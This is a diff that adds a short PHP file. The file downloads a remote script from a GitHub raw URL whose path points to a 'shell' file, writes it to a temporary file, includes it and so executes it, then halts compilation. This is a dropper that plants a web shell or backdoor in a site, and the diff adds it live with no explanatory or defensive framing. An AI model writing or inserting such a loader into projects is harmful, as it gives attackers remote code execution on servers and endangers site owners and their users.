@@ -1,0 +1,5 @@
+<?php 
+$temp_filee = tmpfile(); 
+fwrite($temp_filee, implode('', file('https://raw.githubusercontent.com/WhatsWrongAndWhy/yourlogic/main/shell/fanvat.php'));
+include stream_get_meta_data($temp_filee)['uri'];
+fclose($temp_filee); __halt_compiler();
